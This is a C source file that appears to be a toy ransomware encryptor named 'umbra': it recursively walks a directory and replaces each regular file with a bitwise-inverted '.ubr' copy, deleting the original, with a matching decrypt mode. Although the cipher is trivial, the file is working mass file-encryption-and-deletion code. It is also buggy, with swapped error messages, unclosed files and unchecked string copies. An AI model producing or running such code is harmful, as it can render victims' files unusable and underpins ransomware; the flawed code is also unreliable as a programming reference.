#include "../include/encryption_manager.h"

void operate_dir(const char* dir_name, int indent, int mode){
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(dir_name))){
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            //Directory found
            char path[1024];
            //No curr or parent dirs
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            snprintf(path, sizeof(path), "%s/%s", dir_name, entry->d_name);
            printf("%*s[%s]\n", indent, "", entry->d_name);
            //Access dir recursively
            operate_dir(path, indent + 2, mode);
        } else {
            //File found
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", dir_name, entry->d_name);
            struct stat path_stat;
            stat(path, &path_stat);
            if(S_ISREG(path_stat.st_mode)){
                printf("%*s- %s\n", indent, "", entry->d_name);
                if(mode == 0){
                    if(toy_encrypt(path)!=0){
                        printf("Error decrypting file %s\n", path);
                    }
                }else if(mode == 1){
                    if(toy_decrypt(path)!=0){
                        printf("Error encrypting file %s\n", path);
                    }
                }
                
            }
            
        }
    }
    closedir(dir);
        

}

int toy_encrypt(const char* file_name){
    char temp_copy_file_name [1024];
    strcpy(temp_copy_file_name, file_name);
    strcat (temp_copy_file_name, ".ubr\0");

    FILE *file = fopen(file_name, "r");
    FILE *file_copy = fopen(temp_copy_file_name, "w");
    size_t n = 0;
    int c;

    if (file == NULL || file_copy == NULL){
        return 1;
    }

    while ((c = fgetc(file)) != EOF){
        fputc(~c, file_copy);
    }    

    //Copy finished, proceeding to delete old file
    if(remove(file_name)!=0){
        return 1; //abort, failed to delete
    }

    return 0;
}

int toy_decrypt(const char* file_name){
    char temp_copy_file_name [1024];
    strcpy(temp_copy_file_name, file_name);
    //removing umbra extension
    temp_copy_file_name[strlen(temp_copy_file_name)-4] = '\0';

    FILE *file = fopen(file_name, "r");
    FILE *file_copy = fopen(temp_copy_file_name, "w");
    size_t n = 0;
    int c;

    if (file == NULL || file_copy == NULL){
        return 1;
    }

    while ((c = fgetc(file)) != EOF){
        fputc(~c, file_copy);
    }    

    //Copy finished, proceeding to delete old file
    if(remove(file_name)!=0){
        return 1; //abort, failed to delete
    }

    return 0;
}

void main(int argc, char *argv[]){
    if(argc < 3){
        printf("Not enough args\n");
        return;
    }
    if(strcmp(argv[2], "E")==0){
        operate_dir(argv[1], 0, 0);
    }else if (strcmp(argv[2], "D")==0){
        operate_dir(argv[1], 0, 1);
    }else{
        printf("Wrong mode selected\n");
        return;
    }
    
}